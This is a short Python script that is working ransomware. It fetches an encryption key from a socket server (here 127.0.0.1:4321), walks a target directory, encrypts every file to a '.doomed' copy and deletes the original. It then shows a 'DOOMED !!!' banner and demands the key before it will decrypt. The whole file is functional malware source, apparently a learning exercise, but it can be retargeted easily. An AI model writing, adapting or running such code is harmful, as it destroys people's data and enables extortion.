from cryptography.fernet import Fernet
import socket,os,pyfiglet

def encrypt(filename,fernet):
    with open(filename,'rb') as normal_file:
        with open(filename + ".doomed",'wb') as file:
            data = normal_file.read()
            #encrypt content data
            encrypted = fernet.encrypt(data)
    #write encrypted data to file
            file.write(encrypted)
            file.close()
        normal_file.close()
        os.remove(filename)  

def decrypt(filename,fernet):
    with open(filename,'rb') as encrypted_file:
        with open(filename[:-7],'wb') as normal_file:
            decrypted = fernet.decrypt(encrypted_file.read())
            normal_file.write(decrypted)
            normal_file.close()
        encrypted_file.close()
    os.remove(filename)
# create socket 

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',4321))
s.send(b'key')
k= s.recv(2048).decode()
s.close()

#create fernet object
fernet = Fernet(k)

for path,dirs,files in os.walk("C:/Users/pc/Desktop/python-projects/importants/"):
    for file in files:
        encrypt(os.path.join(path,file),fernet)

del k 
del fernet

banner = pyfiglet.figlet_format("DOOMED !!!")

print(banner)

while True:
    key = input("Enter key: ")
    fernet = Fernet(key)
    try:
        for path,dirs,files in os.walk("C:/Users/pc/Desktop/python-projects/importants/"):
            for file in files:
                decrypt(os.path.join(path,file),fernet)
    except Exception as e:
        print("wrong key--> ",e)
    
    else:
        break

